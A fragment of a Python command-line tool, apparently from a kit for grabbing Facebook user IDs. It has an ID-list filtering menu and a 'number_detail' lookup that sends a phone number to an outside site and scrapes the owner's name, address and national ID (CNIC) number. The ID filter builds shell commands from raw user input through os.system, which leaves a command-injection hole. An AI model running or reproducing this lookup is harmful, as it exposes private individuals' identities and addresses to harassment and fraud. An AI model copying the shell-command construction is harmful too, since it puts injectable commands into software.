                                exit()
                        else:
                                pass
                except IOError:
                        pass
                ####_fileq.close()
        print(50*"-")
        tot = open(__file_s2, 'r').readlines()
        print(' \033[1;97m Process Completed  ')
        print(f'  Total ids  : {g}'+str(len(tot)))
        print(f'  {s}File saved as: {y}'+__file_s2)
        print(50*"\033[1;97m-")
#--(file-seperator)----#

def sep():

        os.system('clear');print(logo)
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f" {ro}Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(50*"\033[0m-")

        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(50*"\033[0m-")

        input('\033[0m[Press enter to back] ')
        caseher()
#--(number-detail)----#
def number_detail():

        from bs4 import BeautifulSoup
        from bs4 import BeautifulSoup as parser
        os.system("clear");print(logo)
        numm = input(" Number : ")
        head = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded',"Referer": "https://freepicccs.com/index2.php?msg=Please%20Enter%20atleast%201%20Mobile%20Number%20or%20CNIC"}
        dataa = {'cnnum': numm}
        r = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=dataa)
        bc = re.findall("\<div(.*?)</table>",str(r.text))
        open(".tt1.txt","w").write(str(bc))
        bx = open(".tt1.txt","r").read()
        bx = bx.replace("</strong>","<strong>")
        bx = bx.split("<strong>")
        try:
                number = bx[1]
        except:
                number = ' '
        try:
                date = bx[3]
        except:
                date = ' '
        try:
                name = bx[5]
        except:
                name = ' '
        try:
                address = bx[9]
        except:
                address = ' '
        try:
                cnic = bx[7]
        except:
                cnic = ' '
        print(50*"-")
        print(f" Number : {number.capitalize()}")
        print(f" Date : {date.capitalize()}")
        print(f" Name : {name.capitalize()}")
        print(f" Address : {address.capitalize()}")
        print(f" Cnic : {cnic.capitalize()}")

        input('\033[0m[Press enter to back] ')
        caseher()

os.system('clear');main()
